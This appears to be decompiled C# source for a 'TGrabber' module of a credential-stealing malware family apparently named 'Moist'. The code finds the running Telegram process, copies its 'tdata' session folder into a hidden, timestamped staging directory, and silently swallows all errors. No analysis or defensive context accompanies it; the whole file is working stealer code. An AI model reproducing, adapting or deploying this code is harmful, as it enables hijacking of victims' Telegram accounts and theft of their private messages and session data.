using System;
using System.Diagnostics;
using System.IO;

namespace Moist
{
	// Token: 0x02000055 RID: 85
	public class TGrabber
	{
		// Token: 0x06000236 RID: 566 RVA: 0x000122D0 File Offset: 0x000104D0
		public static void Start(string Moist_Dir)
		{
			try
			{
				string processName = "Telegram";
				Process[] processesByName = Process.GetProcessesByName(processName);
				if (processesByName.Length >= 1)
				{
					string text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
					if (Directory.Exists(text))
					{
						string string_ = Moist_Dir + "\\Telegram_" + ((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
						TGrabber.smethod_0(text, string_);
						TGrabber.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000237 RID: 567 RVA: 0x00012380 File Offset: 0x00010580
		private static void smethod_0(string string_0, string string_1)
		{
			try
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(string_1);
				directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				foreach (string string_2 in Directory.GetFiles(string_0))
				{
					TGrabber.smethod_1(string_2, string_1);
				}
				foreach (string string_3 in Directory.GetDirectories(string_0))
				{
					TGrabber.smethod_2(string_3, string_1);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000238 RID: 568 RVA: 0x000123FC File Offset: 0x000105FC
		private static void smethod_1(string string_0, string string_1)
		{
			try
			{
				string fileName = Path.GetFileName(string_0);
				if (!TGrabber.bool_0 || (fileName[0] == 'm' || fileName[1] == 'a') || fileName[2] == 'p')
				{
					string destFileName = string_1 + "\\" + fileName;
					File.Copy(string_0, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000239 RID: 569 RVA: 0x00012470 File Offset: 0x00010670
		private static void smethod_2(string string_0, string string_1)
		{
			try
			{
				TGrabber.bool_0 = true;
				TGrabber.smethod_0(string_0, string_1 + "\\" + Path.GetFileName(string_0));
				TGrabber.bool_0 = false;
			}
			catch
			{
			}
		}

		// Token: 0x0600023A RID: 570 RVA: 0x0000446C File Offset: 0x0000266C
		public TGrabber()
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
		}

		// Token: 0x040000FF RID: 255
		public static int count;

		// Token: 0x04000100 RID: 256
		private static bool bool_0;
	}
}
